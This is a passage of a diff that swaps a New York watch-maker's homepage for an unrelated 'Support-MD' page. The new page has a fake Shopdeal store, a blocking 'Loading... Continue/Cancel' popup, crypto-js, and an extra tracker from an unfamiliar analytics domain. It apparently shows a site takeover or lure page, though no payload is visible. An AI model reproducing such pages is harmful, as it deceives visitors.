@@ -1,690 +1,719 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>CompassDialUp | Navigational Chronometry &amp; Expedition Horology</title>
-  <meta name="description" content="Precision compass-bezel expedition watches, solar azimuth navigation timepieces, Glucydur balance chronometers, and anti-magnetic field calibers handcrafted in New York.">
-  <link rel="canonical" href="https://compassdialup.com/">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Support-MD</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600&family=Playfair+Display:ital,wght@0,500;0,600;0,700;1,600&family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
-  <!-- Google Analytics Tag G-0LY0HY7L01 -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+
+  <style>
+  
+    :root{
+      --ink:#0b1020;
+      --muted:#64748b;
+      --line:#e9ebf2;
+      --surface:#f8fafc;
+      --brand:#6d28d9;
+      --brand-dark:#5b21b6;
+      --accent:#db2777;
+      --radius:18px;
+      --shadow-sm:0 1px 2px rgba(16,24,40,.06), 0 1px 3px rgba(16,24,40,.08);
+      --shadow-md:0 12px 30px -14px rgba(16,24,40,.22);
+      --shadow-lg:0 28px 60px -24px rgba(16,24,40,.32);
+      --max:1180px;
+    }
+
+    *,*::before,*::after{ box-sizing:border-box; }
+    html{ scroll-behavior:smooth; }
+    body{
+      margin:0;
+      font-family:'Inter',system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+      color:var(--ink);
+      background:#fff;
+      line-height:1.6;
+      -webkit-font-smoothing:antialiased;
+    }
+    img{ max-width:100%; display:block; }
+    a{ color:inherit; text-decoration:none; }
+    button{ font:inherit; }
+    ul{ list-style:none; margin:0; padding:0; }
+
+    .container{ width:min(var(--max), 100% - 48px); margin-inline:auto; }
+
+    /* ============================================================
+       LOADING POPUP
+       ============================================================ */
+    .popup{
+      position:fixed; inset:0; z-index:9999;
+      display:flex; align-items:center; justify-content:center;
+      background:#fff; padding:24px;
+    }
+    .popup-content{
+      width:100%; max-width:560px;
+      text-align:center;
+      animation:popIn .5s cubic-bezier(.2,.8,.3,1) both;
+    }
+    @keyframes popIn{
+      from{ opacity:0; transform:translateY(14px) scale(.98); }
+      to{ opacity:1; transform:none; }
+    }
+    .loading-gif{
+      width:120px; height:120px;
+      margin:0 auto 26px;
+    }
+    .popup-title{
+      font-size:clamp(1.3rem,2.6vw,1.6rem);
+      font-weight:800; letter-spacing:-.025em;
+      margin:0 0 8px;
+    }
+    .popup-content p.sub{
+      margin:0 0 32px;
+      color:var(--muted);
+      font-size:.95rem;
+      font-weight:500;
+    }
+    .buttons{
+      display:flex; justify-content:center; gap:14px; flex-wrap:wrap;
+    }
+    .buttons button{
+      min-width:152px;
+      padding:14px 30px;
+      border:0; border-radius:13px;
+      cursor:pointer; font-weight:700; font-size:1rem;
+      transition:transform .18s ease, box-shadow .18s ease, background .18s ease;
+    }
+    #cancelBtn{ background:#f1f5f9; color:#334155; }
+    #cancelBtn:hover{ background:#e2e8f0; }
+    #continueBtn{
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      color:#fff;
+      box-shadow:0 16px 30px -14px rgba(109,40,217,.85);
+    }
+    #continueBtn:hover{ transform:translateY(-2px); }
+
+    .hint{
+      background:linear-gradient(90deg,#1e1b4b,#4c1d95 45%,#831843);
+      color:#ede9fe;
+      text-align:center;
+      font-size:.82rem;
+      font-weight:600;
+      letter-spacing:.02em;
+      padding:11px 20px;
+      min-height:42px;
+      display:flex; align-items:center; justify-content:center;
+      gap:10px;
+    }
+
+    .nav{
+      position:sticky; top:0; z-index:80;
+      display:flex; align-items:center; gap:26px;
+      height:72px;
+      padding:0 max(24px, calc((100vw - var(--max)) / 2));
+      background:rgba(255,255,255,.86);
+      backdrop-filter:blur(16px);
+      -webkit-backdrop-filter:blur(16px);
+      border-bottom:1px solid var(--line);
+    }
+    .brand{
+      display:flex; align-items:center; gap:11px;
+      font-weight:800; font-size:1.12rem;
+      letter-spacing:-.025em; white-space:nowrap;
+    }
+    .brand-mark{
+      width:36px; height:36px; flex:none;
+      display:grid; place-items:center;
+      border-radius:11px; font-size:1rem;
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      box-shadow:0 10px 22px -10px rgba(109,40,217,.9);
+    }
+
+    .links{ display:flex; gap:6px; }
+    .links a{
+      font-size:.9rem; font-weight:500; color:#4b5563;
+      padding:8px 14px; border-radius:10px;
+      transition:color .18s ease, background .18s ease;
+    }
+    .links a:hover{ color:var(--brand); background:#f5f3ff; }
+
+    .clock{
+      margin-left:auto;
+      display:inline-flex; align-items:center; gap:6px;
+      font-size:.78rem; font-weight:600; color:var(--brand-dark);
+      background:#f5f3ff; border:1px solid #ede9fe;
+      padding:7px 13px; border-radius:999px; white-space:nowrap;
+    }
+    .cart-btn{
+      display:inline-flex; align-items:center; gap:8px;
+      border:0; cursor:pointer;
+      background:var(--ink); color:#fff;
+      font-weight:600; font-size:.88rem;
+      padding:10px 18px; border-radius:999px;
+      transition:transform .18s ease, background .18s ease;
+    }
+    .cart-btn:hover{ background:var(--brand); transform:translateY(-1px); }
+    .cart-btn .badge{
+      background:#fff; color:var(--ink);
+      border-radius:999px; min-width:20px; height:20px;
+      display:grid; place-items:center;
+      padding:0 6px; font-size:.72rem; font-weight:800;
+    }
+
+    @media (max-width:900px){
+      .links{ display:none; }
+      .clock{ display:none; }
+    }
+    @media (max-width:560px){
+      .nav{ gap:14px; height:66px; padding-inline:18px; }
+      .cart-btn{ padding:9px 14px; font-size:.82rem; }
+    }
+
+    /* ============================================================
+       HERO
+       ============================================================ */
+    .hero{
+      display:grid;
+      grid-template-columns:1.03fr .97fr;
+      gap:60px; align-items:center;
+      padding:76px max(24px, calc((100vw - var(--max)) / 2)) 68px;
+      background:
+        radial-gradient(900px 420px at 8% -20%, rgba(109,40,217,.14), transparent 62%),
+        radial-gradient(760px 420px at 98% -6%, rgba(219,39,119,.12), transparent 58%),
+        linear-gradient(180deg,#fbfaff,#fff);
+    }
+    @media (max-width:960px){
+      .hero{ grid-template-columns:1fr; gap:44px; padding-top:52px; padding-bottom:52px; }
+    }
+
+    .eyebrow{
+      display:inline-flex; align-items:center; gap:8px;
+      background:#fff; border:1px solid #ede9fe;
+      color:var(--brand-dark);
+      font-size:.78rem; font-weight:700;
+      letter-spacing:.06em; text-transform:uppercase;
+      padding:7px 15px; border-radius:999px;
+      box-shadow:var(--shadow-sm);
+      margin-bottom:20px;
+    }
+    .eyebrow .dot{
+      width:7px; height:7px; border-radius:50%;
+      background:var(--accent);
+      box-shadow:0 0 0 4px rgba(219,39,119,.16);
+    }
+
+    .hero-text h1{
+      font-size:clamp(2.2rem,5vw,3.4rem);
+      line-height:1.08; letter-spacing:-.035em;
+      font-weight:900; margin:0 0 18px;
+    }
+    .hero-text h1 span{
+      background:linear-gradient(115deg,var(--brand),var(--accent));
+      -webkit-background-clip:text; background-clip:text; color:transparent;
+    }
+    .hero-text p{
+      font-size:1.05rem; color:var(--muted);
+      max-width:490px; margin:0 0 30px;
+    }
+
+    .cta{
+      display:inline-flex; align-items:center; gap:9px;
+      padding:15px 30px; border-radius:999px;
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      color:#fff; font-weight:700; font-size:.95rem;
+      box-shadow:0 16px 32px -16px rgba(109,40,217,.9);
+      transition:transform .18s ease, box-shadow .18s ease;
+    }
+    .cta:hover{ transform:translateY(-2px); box-shadow:0 22px 40px -18px rgba(109,40,217,.95); }
+
+    .hero-stats{
+      display:flex; gap:34px; flex-wrap:wrap;
+      margin-top:40px; padding-top:26px;
+      border-top:1px solid var(--line);
+    }
+    .hero-stats strong{
+      display:block; font-size:1.35rem; font-weight:800; letter-spacing:-.02em;
+    }
+    .hero-stats span{ font-size:.82rem; color:var(--muted); }
+
+    .hero-img{
+      width:100%; aspect-ratio:5/4; object-fit:cover;
+      border-radius:26px;
+      box-shadow:var(--shadow-lg);
+    }
+
+    /* ============================================================
+       TRUST STRIP
+       ============================================================ */
+    .trust{
+      border-block:1px solid var(--line);
+      background:var(--surface);
+    }
+    .trust-grid{
+      display:grid; grid-template-columns:repeat(4,1fr);
+      gap:10px; padding:22px 0;
+    }
+    .trust-item{
+      display:flex; align-items:center; justify-content:center; gap:9px;
+      font-size:.85rem; font-weight:600; color:#475569;
+      padding:6px 10px; border-right:1px solid var(--line);
+    }
+    .trust-item:last-child{ border-right:0; }
+    .trust-item span{ font-size:1.05rem; }
+    @media (max-width:860px){
+      .trust-grid{ grid-template-columns:repeat(2,1fr); gap:14px; }
+      .trust-item{ border-right:0; justify-content:flex-start; }
+    }
+
+    /* ============================================================
+       SECTIONS
+       ============================================================ */
+    .section{ padding:76px 0; }
+    .section-head{ text-align:center; max-width:640px; margin:0 auto 42px; }
+    .section-head .kicker{
+      display:inline-block;
+      font-size:.76rem; font-weight:800;
+      letter-spacing:.12em; text-transform:uppercase;
+      color:var(--brand); margin-bottom:10px;
+    }
+    .section-head h2{
+      font-size:clamp(1.6rem,3.2vw,2.2rem);
+      font-weight:900; letter-spacing:-.03em;
+      margin:0 0 10px; line-height:1.15;
+    }
+    .section-head p{ margin:0; color:var(--muted); font-size:.97rem; }
+
+
+    .grid{
+      display:grid; gap:24px;
+      grid-template-columns:repeat(auto-fill,minmax(250px,1fr));
+    }
+    .card{
+      display:flex; flex-direction:column;
+      background:#fff; border:1px solid var(--line);
+      border-radius:var(--radius); overflow:hidden;
+      transition:transform .22s ease, box-shadow .22s ease, border-color .22s ease;
+    }
+    .card:hover{
+      transform:translateY(-6px);
+      box-shadow:var(--shadow-lg);
+      border-color:transparent;
+    }
+    .card-media{
+      position:relative; aspect-ratio:4/3;
+      overflow:hidden; background:#f1f5f9;
+    }
+    .card-media img{
+      width:100%; height:100%; object-fit:cover;
+      transition:transform .55s cubic-bezier(.2,.7,.3,1);
+    }
+    .card:hover .card-media img{ transform:scale(1.07); }
+
+    .card .badge{
+      position:absolute; top:12px; left:12px;
+      font-size:.68rem; font-weight:800; letter-spacing:.06em;
+      text-transform:uppercase; color:#fff;
+      padding:6px 11px; border-radius:999px;
+      background:var(--ink);
+    }
+    .card .badge--sale{ background:var(--accent); }
+    .card .badge--new{ background:#0ea5e9; }
+
+    .card .body{
+      padding:16px 18px 18px;
+      display:flex; flex-direction:column; flex:1;
+    }
+    .card .cat{
+      font-size:.7rem; font-weight:700; letter-spacing:.1em;
+      text-transform:uppercase; color:#94a3b8; margin-bottom:6px;
+    }
+    .card h3{
+      margin:0 0 8px; font-size:1rem; font-weight:700; letter-spacing:-.015em;
+    }
+    .price-row{
+      display:flex; align-items:baseline; gap:8px;
+      margin-top:auto; padding-top:6px;
+    }
+    .card .price{
+      font-size:1.12rem; font-weight:800;
+      letter-spacing:-.02em; color:var(--ink);
+    }
+    .card .old{
+      font-size:.85rem; color:#a3aab8;
+      text-decoration:line-through; font-weight:500;
+      margin:0;
+    }
+    .save{
+      margin-left:auto;
+      font-size:.7rem; font-weight:800;
+      color:#047857; background:#ecfdf5;
+      padding:3px 8px; border-radius:999px;
+    }
+
+    .add{
+      margin-top:14px; width:100%;
+      display:inline-flex; align-items:center; justify-content:center; gap:8px;
+      border:1px solid var(--ink); background:#fff; color:var(--ink);
+      font-weight:700; font-size:.88rem;
+      padding:11px; border-radius:11px; cursor:pointer;
+      transition:background .2s ease, color .2s ease, transform .18s ease;
+    }
+    .add:hover{ background:var(--ink); color:#fff; transform:translateY(-1px); }
+    .add:active{ transform:translateY(0); }
+
+  
+    .about{
+      background:var(--surface);
+      border-block:1px solid var(--line);
+    }
+    .features{
+      display:grid; gap:22px;
+      grid-template-columns:repeat(auto-fit,minmax(210px,1fr));
+    }
+    .feature{
+      background:#fff; border:1px solid var(--line);
+      border-radius:var(--radius);
+      padding:28px 24px;
+      text-align:left;
+      transition:transform .22s ease, box-shadow .22s ease;
+    }
+    .feature:hover{ transform:translateY(-4px); box-shadow:var(--shadow-md); }
+    .feature span{
+      display:grid; place-items:center;
+      width:48px; height:48px;
+      border-radius:14px; font-size:1.3rem;
+      background:linear-gradient(135deg,#f5f3ff,#fdf2f8);
+      border:1px solid #ede9fe;
+      margin-bottom:16px;
+    }
+    .feature h3{ margin:0 0 6px; font-size:1rem; font-weight:800; letter-spacing:-.015em; }
+    .feature p{ margin:0; color:var(--muted); font-size:.87rem; line-height:1.55; }
+
+    /* ============================================================
+       FOOTER
+       ============================================================ */
+    .footer{
+      background:#0b1020;
+      color:#94a3b8;
+      text-align:center;
+      padding:44px 24px;
+      font-size:.85rem;
+    }
+    .footer .fbrand{
+      display:inline-flex; align-items:center; gap:10px;
+      color:#fff; font-weight:800; font-size:1rem;
+      letter-spacing:-.02em; margin-bottom:10px;
+    }
+    .footer p{ margin:0 0 6px; }
+    .footer small{ color:#64748b; font-size:.78rem; }
+
+  
+    @media (prefers-reduced-motion:reduce){
+      *{ animation-duration:.001ms !important; transition-duration:.001ms !important; }
+      html{ scroll-behavior:auto; }
+    }
+  </style>
+
+  <!-- Google tag (gtag.js) -->
   <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
   <script>
     window.dataLayer = window.dataLayer || [];
     function gtag(){dataLayer.push(arguments);}
     gtag('js', new Date());
+
     gtag('config', 'G-0LY0HY7L01');
   </script>
-  <link rel="stylesheet" href="assets/css/style.css">
+
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+
 </head>
 <body>
 
-<header class="site-header">
-  <div class="header-inner">
-    <a href="index.php" class="brand-logo">
-      Compass<span>DialUp</span>
-    </a>
-    <ul class="nav-links">
-      <li><a href="index.php" class="active">Atelier Home</a></li>
-      <li><a href="about.html" class="">Horological Heritage</a></li>
-      <li><a href="blog.html" class="">Chronometry Treatises</a></li>
-      <li><a href="contact.html" class="">Commission Desk</a></li>
-    </ul>
-    <div class="header-cta">
-      <a href="tel:+18887775845" style="font-family:var(--font-mono);font-size:0.85rem;font-weight:600;color:var(--color-slate-700);">+1-888-777-5845</a>
-      <a href="contact.html" class="btn btn-primary">Custom Commission</a>
-      <button class="mobile-toggle" id="mobile-toggle" aria-label="Toggle navigation menu">
-        <span></span>
-        <span></span>
-        <span></span>
-      </button>
-    </div>
-  </div>
-</header>
-<div class="mobile-drawer" id="mobile-drawer">
-  <ul class="mobile-drawer-nav">
-    <li><a href="index.php">Atelier Home</a></li>
-    <li><a href="about.html">Horological Heritage</a></li>
-    <li><a href="blog.html">Chronometry Treatises</a></li>
-    <li><a href="contact.html">Commission Desk</a></li>
-    <li style="margin-top:2rem;padding-top:1.5rem;border-top:1px solid var(--color-border);">
-      <p style="font-family:var(--font-mono);font-size:0.85rem;color:var(--color-slate-600);margin-bottom:0.5rem;">Direct Telephone:</p>
-      <a href="tel:+18887775845" style="font-size:1.1rem;font-weight:700;color:var(--color-accent);">+1-888-777-5845</a>
-    </li>
-    <li>
-      <p style="font-family:var(--font-mono);font-size:0.85rem;color:var(--color-slate-600);margin-bottom:0.5rem;">Atelier Gallery:</p>
-      <p style="font-size:0.95rem;color:var(--color-slate-800);">181 Mercer Street, New York, NY 10012, United States</p>
-    </li>
-  </ul>
-</div>
-
-<!-- Section 1: Hero Banner -->
-<section class="hero">
-  <div class="container">
-    <div class="hero-grid">
-      <div>
-        <div class="hero-badge">
-          <span>&#9670;</span> Bespoke Navigational Horology Atelier
-        </div>
-        <h1 class="hero-title">
-          The Art of Solar Compass Chronometry.
-        </h1>
-        <p class="hero-desc">
-          CompassDialUp creates high-precision expedition chronometers engineered for uncharted planetary voyages. Featuring bidirectional 360-degree solar azimuth bezels, antimagnetic silicon hairsprings, and COSC-certified mechanical calibers, our timepieces transform orbital solar kinetics into an intuitive terrestrial guide.
-        </p>
-        <div style="display:flex;gap:1.25rem;align-items:center;flex-wrap:wrap;">
-          <a href="contact.html" class="btn btn-primary">Commission an Expedition Chronometer</a>
-          <a href="about.html" class="btn btn-outline">Explore Atelier Heritage &rarr;</a>
-        </div>
-        <div style="margin-top:2.5rem;display:flex;gap:2.5rem;border-top:1px solid var(--color-border);padding-top:1.5rem;">
-          <div>
-            <div style="font-family:var(--font-serif);font-size:1.85rem;font-weight:700;color:var(--color-accent);">&plusmn;2 Sec</div>
-            <div style="font-size:0.8rem;color:var(--color-slate-600);text-transform:uppercase;font-family:var(--font-mono);">Daily Rate Deviation</div>
-          </div>
-          <div>
-            <div style="font-family:var(--font-serif);font-size:1.85rem;font-weight:700;color:var(--color-accent);">15,000 G</div>
-            <div style="font-size:0.8rem;color:var(--color-slate-600);text-transform:uppercase;font-family:var(--font-mono);">Magnetic Resistance</div>
-          </div>
-          <div>
-            <div style="font-family:var(--font-serif);font-size:1.85rem;font-weight:700;color:var(--color-accent);">300 M</div>
-            <div style="font-size:0.8rem;color:var(--color-slate-600);text-transform:uppercase;font-family:var(--font-mono);">Isobaric Depth Rating</div>
-          </div>
-        </div>
-      </div>
-      <div class="hero-img-box">
-        <img src="assets/images/hero_navigational_compass_bezel_chronometer.jpg" alt="CompassDialUp expedition chronometer featuring bidirectional solar azimuth compass bezel" class="hero-img">
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <h2 class="popup-title">Loading... Please wait.</h2>
+      <p class="sub">We're preparing your store experience.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
       </div>
     </div>
   </div>
-</section>
+  
+  <div id="shop">
+    <div class="hint">🛍️ Shopdeal — Summer Sale is live · Up to 50% off</div>
 
-<!-- Section 2: Four Pillars of Navigational Horology -->
-<section class="section section-subtle">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Observatory Grade Benchmarks</span>
-      <h2 class="section-title">The Four Pillars of Navigational Precision</h2>
-      <p class="section-lead">
-        Combining seventeenth-century marine chronometry principles with aerospace metallurgy to produce unbreakable field instruments.
-      </p>
-    </div>
-    <div class="grid-4">
-      <div class="card">
-        <div class="card-body">
-          <span class="card-tag">Pillar I</span>
-          <h3 class="card-title">Solar Azimuth Compass Bezel</h3>
-          <p class="card-desc">
-            Bidirectional ceramic and titanium bezel graduated in 360 individual degree increments and cardinal quadrants for real-time celestial navigation.
-          </p>
-        </div>
-      </div>
-      <div class="card">
-        <div class="card-body">
-          <span class="card-tag">Pillar II</span>
-          <h3 class="card-title">Glucydur Isochronism</h3>
-          <p class="card-desc">
-            Beryllium-bronze balance wheel paired with gold microstella regulation weights, ensuring steady oscillation across minus 40&deg;C to plus 70&deg;C.
-          </p>
-        </div>
-      </div>
-      <div class="card">
-        <div class="card-body">
-          <span class="card-tag">Pillar III</span>
-          <h3 class="card-title">Nivachron Flux Shielding</h3>
-          <p class="card-desc">
-            Paramagnetic titanium-alloy hairspring resisting electromagnetic fields up to 15,000 gauss without residual magnetic hysteresis.
-          </p>
-        </div>
-      </div>
-      <div class="card">
-        <div class="card-body">
-          <span class="card-tag">Pillar IV</span>
-          <h3 class="card-title">Grade 5 Titanium Monobloc</h3>
-          <p class="card-desc">
-            Solid aerospace-grade titanium case housing CNC-machined from single billets with dual O-ring screw-down crown and helium escape valve.
-          </p>
-        </div>
-      </div>
-    </div>
-  </div>
-</section>
+    <header class="nav">
+      <div class="brand"><span class="brand-mark">🛍️</span> Shopdeal</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
+      </nav>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
+    </header>
 
-<!-- Section 3: Signature Chronometer Series -->
-<section class="section">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Atelier Catalog</span>
-      <h2 class="section-title">The Expedition Chronometer Series</h2>
-      <p class="section-lead">
-        Handcrafted in limited annual allocations at our Mercer Street workshop.
-      </p>
-    </div>
-    <div class="grid-3">
-      <div class="card">
-        <div class="card-img">
-          <img src="assets/images/field_expedition_compass_dial_calibration.jpg" alt="Field expedition compass dial calibration">
-        </div>
-        <div class="card-body">
-          <span class="card-tag">Calibre 380-NAV &bull; 72H Reserve</span>
-          <h3 class="card-title">The Mercer Navigator GMT</h3>
-          <p class="card-desc">
-            Featuring an independent 24-hour solar hand, ceramic azimuth bezel, and matte black instrument dial coated in Super-LumiNova Grade X1.
-          </p>
-          <a href="contact.html" class="btn btn-outline" style="margin-top:auto;">Commission This Caliber &rarr;</a>
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <span class="eyebrow"><span class="dot"></span> Summer Sale · Up to 50% Off</span>
+        <h1>Everyday essentials, <span>beautifully priced.</span></h1>
+        <p>Trendy products, free stock photos, all on a single page. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now →</a>
+
+        <div class="hero-stats">
+          <div><strong>12,480+</strong><span>Happy customers</span></div>
+          <div><strong>4.9 / 5</strong><span>Average rating</span></div>
+          <div><strong>48 hrs</strong><span>US delivery</span></div>
         </div>
       </div>
-      <div class="card">
-        <div class="card-img">
-          <img src="assets/images/column_wheel_chronograph_calibre_geartrain.jpg" alt="Column wheel chronograph calibre geartrain">
-        </div>
-        <div class="card-body">
-          <span class="card-tag">Calibre 410-CHRONO &bull; Column Wheel</span>
-          <h3 class="card-title">The Hudson Azimuth Chronograph</h3>
-          <p class="card-desc">
-            Integrated lateral-clutch chronograph mechanism paired with telemetric and tachymetric outer chapter rings for dead-reckoning speed calculations.
-          </p>
-          <a href="contact.html" class="btn btn-outline" style="margin-top:auto;">Commission This Caliber &rarr;</a>
-        </div>
-      </div>
-      <div class="card">
-        <div class="card-img">
-          <img src="assets/images/tourbillon_cage_carrusel_gravitational_assembly.jpg" alt="Tourbillon cage carrusel gravitational assembly">
-        </div>
-        <div class="card-body">
-          <span class="card-tag">Calibre 550-TOURB &bull; Flying Carrousel</span>
-          <h3 class="card-title">The Polar Expedition Tourbillon</h3>
-          <p class="card-desc">
-            One-minute flying tourbillon cage with titanium balance bridge, engineered to neutralize gravitational timing errors during polar expeditions.
-          </p>
-          <a href="contact.html" class="btn btn-outline" style="margin-top:auto;">Commission This Caliber &rarr;</a>
-        </div>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/900/720" alt="hero" />
+    </section>
+
+    <!-- Histats.com  START  (aync)-->
+    <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript>
+    <!-- Histats.com  END  -->
+
+    <!-- Trust strip -->
+    <div class="trust">
+      <div class="container trust-grid">
+        <div class="trust-item"><span>🚚</span> Free shipping $75+</div>
+        <div class="trust-item"><span>↩️</span> 30-day returns</div>
+        <div class="trust-item"><span>🔒</span> Secure checkout</div>
+        <div class="trust-item"><span>💬</span> 7-day support</div>
       </div>
     </div>
-  </div>
-</section>
 
-<!-- Section 4: Interactive Solar Compass & Azimuth Calculator -->
-<section class="section section-subtle">
-  <div class="container">
-    <div class="calc-box">
-      <div class="calc-grid">
-        <div>
-          <span class="section-tag">Interactive Navigation Telemetry</span>
-          <h2 style="font-family:var(--font-serif);font-size:2.2rem;color:var(--color-slate-900);margin-bottom:1rem;">
-            Solar Compass &amp; Azimuth Bearing Calculator
-          </h2>
-          <p style="color:var(--color-slate-600);margin-bottom:2rem;font-size:0.95rem;">
-            Simulate your watch's solar compass bezel in real time. Enter your local observation time, hemispheric location, and local magnetic declination to determine your exact True North azimuth bearing.
-          </p>
-          <div class="calc-group">
-            <label for="calc-hemisphere">Observation Hemisphere</label>
-            <select id="calc-hemisphere" class="calc-select">
-              <option value="northern" selected>Northern Hemisphere (Hour hand pointed at Sun)</option>
-              <option value="southern">Southern Hemisphere (12 o'clock marker pointed at Sun)</option>
-            </select>
-          </div>
-          <div class="calc-group">
-            <label for="calc-localtime">Local Solar Standard Time (HH:MM)</label>
-            <input type="time" id="calc-localtime" value="14:30" class="calc-input">
-          </div>
-          <div class="calc-group">
-            <label for="calc-declination">Magnetic Declination Angle (Degrees &plusmn;)</label>
-            <input type="number" id="calc-declination" value="-12.5" step="0.5" class="calc-input">
-          </div>
+    <section class="section" id="products">
+      <div class="container">
+        <div class="section-head">
+          <span class="kicker">Featured</span>
+          <h2>Handpicked for you</h2>
+          <p>Six customer favorites, priced in USD — with free shipping on qualifying orders.</p>
         </div>
-        <div>
-          <div class="calc-result">
-            <span style="font-family:var(--font-mono);font-size:0.8rem;text-transform:uppercase;color:var(--color-slate-600);">Calculated True North Bearing</span>
-            <div class="calc-stat-val" id="calc-azimuth-val">347&deg; NNW</div>
-            <p style="font-size:0.85rem;color:var(--color-slate-600);margin-bottom:1.75rem;">Adjust bezel cardinal N marker to match</p>
 
-            <div style="border-top:1px solid var(--color-border);padding-top:1.5rem;display:grid;grid-template-columns:1fr 1fr;gap:1.5rem;">
-              <div>
-                <span style="font-family:var(--font-mono);font-size:0.75rem;text-transform:uppercase;color:var(--color-slate-600);">Hour Hand Angle</span>
-                <div style="font-family:var(--font-serif);font-size:1.5rem;font-weight:700;color:var(--color-slate-900);margin-top:0.25rem;" id="calc-hourangle-val">75&deg; (Hour Mark)</div>
+        <div class="grid">
+          <article class="card">
+            <div class="card-media">
+              <span class="badge badge--sale">Best Seller</span>
+              <img src="https://picsum.photos/seed/shopdeal-sneakers/600/450" alt="Running Sneakers" />
+            </div>
+            <div class="body">
+              <span class="cat">Footwear</span>
+              <h3>Running Sneakers</h3>
+              <div class="price-row">
+                <span class="price">$89.99</span>
+                <span class="old">$139.99</span>
+                <span class="save">−36%</span>
               </div>
-              <div>
-                <span style="font-family:var(--font-mono);font-size:0.75rem;text-transform:uppercase;color:var(--color-slate-600);">True Heading</span>
-                <div style="font-family:var(--font-serif);font-size:1.5rem;font-weight:700;color:var(--color-slate-900);margin-top:0.25rem;" id="calc-truenorth-val">NNW (347.5&deg;)</div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <span class="badge">Limited</span>
+              <img src="https://picsum.photos/seed/shopdeal-watch/600/450" alt="Classic Watch" />
+            </div>
+            <div class="body">
+              <span class="cat">Accessories</span>
+              <h3>Classic Watch</h3>
+              <div class="price-row">
+                <span class="price">$179.99</span>
+                <span class="old">$249.99</span>
+                <span class="save">−28%</span>
               </div>
+              <button class="add" type="button">Add to cart</button>
             </div>
-            <div style="margin-top:2rem;">
-              <a href="contact.html" class="btn btn-primary" style="width:100%;">Commission With Calibrated Bezel</a>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <img src="https://picsum.photos/seed/shopdeal-backpack/600/450" alt="Travel Backpack" />
             </div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- Section 5: Anatomy of an Expedition Compass Watch -->
-<section class="section">
-  <div class="container">
-    <div class="grid-2" style="align-items:center;">
-      <div>
-        <span class="section-tag">Anatomical Horology</span>
-        <h2 class="section-title">Anatomy of a True Navigational Timepiece</h2>
-        <p class="section-lead" style="margin-bottom:2rem;">
-          Engineered to perform in hostile geomagnetic anomalies, high-altitude barometric drops, and freezing sub-zero environments.
-        </p>
-        <div style="display:flex;flex-direction:column;gap:1.5rem;">
-          <div style="display:flex;gap:1rem;align-items:flex-start;">
-            <div style="width:32px;height:32px;border-radius:50%;background:var(--color-accent);color:#fff;display:flex;align-items:center;justify-content:center;font-weight:700;flex-shrink:0;">1</div>
-            <div>
-              <h4 style="font-family:var(--font-serif);font-size:1.15rem;color:var(--color-slate-900);margin-bottom:0.25rem;">Zirconia Ceramic Compass Bezel</h4>
-              <p style="font-size:0.9rem;color:var(--color-slate-600);">Diamond-machined ball bearing click spring with zero backlash, impervious to saltwater scratching and ultraviolet degradation.</p>
+            <div class="body">
+              <span class="cat">Bags</span>
+              <h3>Travel Backpack</h3>
+              <div class="price-row">
+                <span class="price">$69.99</span>
+                <span class="old">$109.99</span>
+                <span class="save">−36%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
             </div>
-          </div>
-          <div style="display:flex;gap:1rem;align-items:flex-start;">
-            <div style="width:32px;height:32px;border-radius:50%;background:var(--color-accent);color:#fff;display:flex;align-items:center;justify-content:center;font-weight:700;flex-shrink:0;">2</div>
-            <div>
-              <h4 style="font-family:var(--font-serif);font-size:1.15rem;color:var(--color-slate-900);margin-bottom:0.25rem;">Soft Iron Faraday Core Casing</h4>
-              <p style="font-size:0.9rem;color:var(--color-slate-600);">Internal mumetal shield encases the escapement, deflecting electromagnetic radiation generated by aircraft cockpits and satellite equipment.</p>
+          </article>
